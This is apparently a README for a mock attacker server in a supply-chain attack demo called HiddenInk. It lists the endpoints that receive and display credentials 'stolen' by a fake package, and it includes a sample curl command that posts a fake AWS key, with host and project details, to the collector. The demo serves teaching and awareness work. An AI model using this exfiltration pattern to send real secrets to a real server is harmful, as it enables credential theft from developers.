# DEMO attacker collector (fictional)

Stands in for the attacker's server in the HiddenInk demo. The fake `vectorbase-auth` package sends the
fake credentials it planted here, and the dashboard shows each theft as a red card. Only fake values ever
reach it. Values are masked on arrival (first 4 characters + "…FAKE") and kept in memory only.

```bash
demo/attacker/run.sh            # Docker, http://localhost:8788/attacker/
```

| Method | Path | Body / result |
|---|---|---|
| POST | `/attacker/collect` | `{host, items: [{name, value}], package?, source?}`. `package` fills the "Delivery" tile, `source` the line under the title. Both are optional. |
| GET | `/attacker/` | dashboard, polls every second |
| GET | `/attacker/events` | `{events: [{host, items, package, source, at}]}`, newest first |
| POST | `/attacker/reset` | clears everything (also the Reset button) |
| GET | `/attacker/health` | `{ok: true}` |

Try it:

```bash
curl -s localhost:8788/attacker/collect -H 'content-type: application/json' \
  -d '{"host":"demo-laptop","package":"vectorbase-auth 0.3.1","source":"Python project in ~/demo/rag-app","items":[{"name":"AWS_ACCESS_KEY_ID","value":"AKIAFAKEFAKEFAKE"}]}'
```

No auth, no persistence, no dependencies beyond the Python standard library. Never expose it beyond the
demo, and destroy the server after judging.
